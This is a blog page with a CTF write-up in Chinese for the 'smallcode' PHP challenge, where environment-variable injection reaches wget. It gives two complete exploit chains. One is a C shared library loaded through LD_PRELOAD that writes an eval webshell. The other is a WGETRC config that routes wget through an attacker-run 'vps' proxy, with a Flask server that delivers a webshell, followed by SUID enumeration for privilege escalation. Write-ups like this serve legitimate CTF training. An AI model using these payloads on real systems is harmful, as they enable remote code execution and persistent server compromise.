@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="smallcode没想到是个原题 原题:startctf环境变量注入的改编 题目源码 123456789101112&lt;?php    highlight_file(__FILE__);    if(isset($_POST[&#x27;context&#x27;]))&#123;        $context &#x3D; $_POST[&#x27;context&#x27;];        fi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="“强网”拟态20-25_smallcode">
+<meta property="og:url" content="http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="smallcode没想到是个原题 原题:startctf环境变量注入的改编 题目源码 123456789101112&lt;?php    highlight_file(__FILE__);    if(isset($_POST[&#x27;context&#x27;]))&#123;        $context &#x3D; $_POST[&#x27;context&#x27;];        fi">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20251216161015455.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20251216155247666.png">
+<meta property="article:published_time" content="2026-01-26T11:15:51.000Z">
+<meta property="article:modified_time" content="2026-01-26T11:17:27.302Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="环境变量rce">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20251216161015455.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>“强网”拟态20-25_smallcode</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Hexo" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/11/05/python-pickle%E8%AF%A6%E8%A7%A3-md/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&text=“强网”拟态20-25_smallcode"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&title=“强网”拟态20-25_smallcode"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&is_video=false&description=“强网”拟态20-25_smallcode"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=“强网”拟态20-25_smallcode&body=Check out this article: http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&title=“强网”拟态20-25_smallcode"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&title=“强网”拟态20-25_smallcode"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&title=“强网”拟态20-25_smallcode"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&title=“强网”拟态20-25_smallcode"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&name=“强网”拟态20-25_smallcode&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&t=“强网”拟态20-25_smallcode"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#smallcode"><span class="toc-number">1.</span> <span class="toc-text">smallcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951-LD-PRELOAD%E5%8A%AB%E6%8C%81"><span class="toc-number">1.1.</span> <span class="toc-text">解法1-LD_PRELOAD劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952-wget%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-WGETRC%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">解法2-wget环境变量 WGETRC利用</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        “强网”拟态20-25_smallcode
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-01-26T11:15:51.000Z" class="dt-published" itemprop="datePublished">2026-01-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/php/" rel="tag">php</a>, <a class="p-category" href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Frce/" rel="tag">环境变量rce</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="smallcode"><a href="#smallcode" class="headerlink" title="smallcode"></a>smallcode</h2><p>没想到是个原题</p>
+<p>原题:<a target="_blank" rel="noopener" href="https://yenannn.github.io/2022/05/30/startctf%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%B9%E7%BC%96/">startctf环境变量注入的改编</a></p>
+<p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;context&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$context</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;context&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$context</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;env&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$env</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;env&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">putenv</span>(<span class="variable">$env</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;wget --content-disposition -N fmyyy&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="解法1-LD-PRELOAD劫持"><a href="#解法1-LD-PRELOAD劫持" class="headerlink" title="解法1-LD_PRELOAD劫持"></a>解法1-LD_PRELOAD劫持</h3><p><a target="_blank" rel="noopener" href="https://luokuang1.github.io/2024/08/16/%E6%B5%85%E8%B0%88LD-PRELOAD%E5%8A%AB%E6%8C%81/">浅谈LD_PRELOAD劫持 | luokuang的博客</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD是一个环境变量，它允许你指定在程序启动之前需要预先加载（preload）的共享库（shared libraries）。当程序启动时，动态链接器（dynamic linker/loader）会首先加载这些通过LD_PRELOAD指定的库，然后才加载程序的其他依赖库。这可以用于拦截或修改程序的函数调用，实现诸如调试、性能分析、功能增强或替换原有库中的函数等目的。</span><br><span class="line"></span><br><span class="line">这里就导致，如果我们在预先加载的库中写入危险命令就可以触发，一般的库都是以 .so 结尾，并且为c语言写的，需要将一个.c文件进行编译后生成一个共享库在将其设置为LD_PRELOAD默认的即可</span><br></pre></td></tr></table></figure>
+
+<p>这里有写入的接口</p>
+<p>构造payload</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">        system(<span class="string">&quot;echo &#x27;&lt;?php echo 1;eval($_POST[1])?&gt;&#x27; &gt; /var/www/html/shell.php&quot;</span>);</span><br><span class="line">        </span><br><span class="line">&#125;   </span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.c文件进行编译后生成一个共享库</span></span><br><span class="line">gcc -shared -fPIC evil.c -o evil.so</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> evil.so|<span class="built_in">base64</span> &gt;evil.txt</span><br></pre></td></tr></table></figure>
+
+<p>POST设置环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env=LD_PRELOAD=/var/www/html/1.txt</span><br></pre></td></tr></table></figure>
+
+<p>之后再次访问<code>index.php</code>,命令执行后达到劫持目的,成功上马</p>
+<p>之后读取<code>/flag</code>无权限,</p>
+<p>可以<code>suid提权</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&#x27;find / -perm -u=s -type f 2&gt;/dev/null&#x27;</span>);</span><br><span class="line"><span class="built_in">nl</span> /f*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20251216161015455.png" alt="be5fb5f69088b2fee5d03a2db59b5b20"></p>
+<h3 id="解法2-wget环境变量-WGETRC利用"><a href="#解法2-wget环境变量-WGETRC利用" class="headerlink" title="解法2-wget环境变量 WGETRC利用"></a>解法2-wget环境变量 WGETRC利用</h3><blockquote>
+<p><code>WGETRC</code> 是一个<strong>环境变量</strong>，用于告诉 <code>wget</code> 从哪里读取其<strong>主配置文件</strong></p>
+<p><code>http_proxy（及 https_proxy）</code>—— 设置代理</p>
+<p><code>output_document</code> 是 <code>wget</code> <strong>内部的一个选项名称</strong>，对应命令行参数 <code>-O</code> 或 <code>--output-document</code>。</p>
+<ul>
+<li>它<strong>不能通过环境变量设置</strong>，必须在命令行中指定。</li>
+</ul>
+</blockquote>
+<p>写入1.txt内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http_proxy=vps:18888</span><br><span class="line">output_document=/var/www/html/myshell.php</span><br></pre></td></tr></table></figure>
+
+<p>POST设置环境变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env=WGETRC=/var/www/html/1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20251216155247666.png" alt="ec5bd1236099c5b2500f5c35429abefd"></p>
+<p>在vps上开个运行脚本的目录，写入一句话木马到1.txt</p>
+<p>在这个目录创建main.py文件，不能叫flask.py，会和包冲突，这个文件是为了wget访问的时候，会下载这个1.txt，然后配合outptu_document参数写入到指定文件即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response</span><br><span class="line"><span class="comment">#import secrets</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>) <span class="keyword">as</span> f: </span><br><span class="line">        r = f.read()</span><br><span class="line">        response = make_response(r)</span><br><span class="line">        response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">        response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=1.txt&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">18888</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.txt</span><br><span class="line">&lt;?php phpinfo();@eval($_REQUEST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>刷新下界面，就可以执行wget，从而走这个代理，写入webshell</p>
+<p>访问&#x2F;myshell.php，发现写入shell</p>
+<p>直接cat &#x2F;flag 没权限，suid提权</p>
+<p>上同</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#smallcode"><span class="toc-number">1.</span> <span class="toc-text">smallcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951-LD-PRELOAD%E5%8A%AB%E6%8C%81"><span class="toc-number">1.1.</span> <span class="toc-text">解法1-LD_PRELOAD劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952-wget%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-WGETRC%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">解法2-wget环境变量 WGETRC利用</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&text=“强网”拟态20-25_smallcode"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&title=“强网”拟态20-25_smallcode"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&is_video=false&description=“强网”拟态20-25_smallcode"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=“强网”拟态20-25_smallcode&body=Check out this article: http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&title=“强网”拟态20-25_smallcode"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&title=“强网”拟态20-25_smallcode"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&title=“强网”拟态20-25_smallcode"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&title=“强网”拟态20-25_smallcode"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&name=“强网”拟态20-25_smallcode&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2026/01/26/%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%812025-smallcode/&t=“强网”拟态20-25_smallcode"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    John Doe
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/lierbushiwo">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
